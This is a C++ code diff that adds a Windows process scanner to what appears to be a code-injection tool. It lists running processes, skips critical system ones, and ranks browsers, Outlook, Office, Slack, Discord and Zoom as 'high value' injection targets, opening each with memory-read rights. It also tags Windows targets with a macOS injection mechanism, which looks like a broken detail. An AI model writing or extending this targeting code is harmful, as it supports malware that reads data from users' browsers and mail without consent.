@@ -176,6 +176,106 @@ std::vector<TargetApp> scanApplications() {
     return results;
 }
 
+#elif defined(_WIN32)
+
+#include <windows.h>
+#include <tlhelp32.h>
+
+static bool isCriticalSystemProcess(const std::string& name_lower) {
+    static const char* denylist[] = {
+        "csrss.exe", "smss.exe", "services.exe", "lsass.exe",
+        "winlogon.exe", "system", "registry", "memory compression",
+        "svchost.exe", "wininit.exe", "spoolsv.exe", "lsm.exe",
+        "sihost.exe", "taskhostw.exe", "runtimebroker.exe",
+        nullptr
+    };
+    for (const char** p = denylist; *p; ++p) {
+        if (name_lower == *p) return true;
+    }
+    return false;
+}
+
+static int scoreProcess(const std::string& name_lower) {
+    static const char* high_value[] = {
+        "explorer.exe", "chrome.exe", "firefox.exe", "msedge.exe",
+        "brave.exe", "opera.exe", "winword.exe", "excel.exe",
+        "powerpnt.exe", "outlook.exe", "slack.exe", "discord.exe",
+        "zoom.exe", "notepad++.exe", "sublime_text.exe", "atom.exe",
+        nullptr
+    };
+    static const char* medium_value[] = {
+        "cmd.exe", "powershell.exe", "windowsterminal.exe",
+        "taskmgr.exe", "code.exe", "devenv.exe", "clion64.exe",
+        "rider64.exe", "pycharm64.exe", "idea64.exe",
+        nullptr
+    };
+    for (const char** p = high_value; *p; ++p) {
+        if (name_lower == *p) return 100;
+    }
+    for (const char** p = medium_value; *p; ++p) {
+        if (name_lower == *p) return 50;
+    }
+    return 0;
+}
+
+std::vector<TargetApp> scanApplications() {
+    std::vector<TargetApp> results;
+    DWORD self_pid = ::GetCurrentProcessId();
+    static const DWORD NEEDED = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ;
+
+    HANDLE snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) return results;
+
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(pe);
+
+    if (::Process32First(snapshot, &pe)) {
+        do {
+            DWORD pid = pe.th32ProcessID;
+            if (pid == self_pid) continue;
+
+            std::string exe_name(pe.szExeFile);
+            // Convert to lowercase for matching
+            for (auto& c : exe_name) c = static_cast<char>(::tolower(c));
+
+            if (isCriticalSystemProcess(exe_name)) continue;
+
+            int sc = scoreProcess(exe_name);
+            if (sc == 0) continue;
+
+            // Get full executable path
+            HANDLE hProcess = ::OpenProcess(NEEDED, FALSE, pid);
+            if (!hProcess) continue;
+
+            char path_buf[MAX_PATH] = {0};
+            DWORD path_len = MAX_PATH;
+            std::string full_path;
+            if (::QueryFullProcessImageNameA(hProcess, 0, path_buf, &path_len)) {
+                full_path.assign(path_buf, path_len);
+            }
+            ::CloseHandle(hProcess);
+
+            if (full_path.empty()) continue;
+
+            results.push_back({
+                full_path,                          // path
+                std::to_string(pid),                // bundle_id (PIDs on Windows)
+                full_path,                          // executable_path
+                InjectionCapability::DYLD_INSERT_LIBRARIES, // capability
+                sc                                  // score
+            });
+        } while (::Process32Next(snapshot, &pe));
+    }
+
+    ::CloseHandle(snapshot);
+
+    std::sort(results.begin(), results.end(),
+              [](const TargetApp& a, const TargetApp& b) {
+                  return a.score > b.score;
+              });
+    return results;
+}
+
 #else
 
 std::vector<TargetApp> scanApplications() {
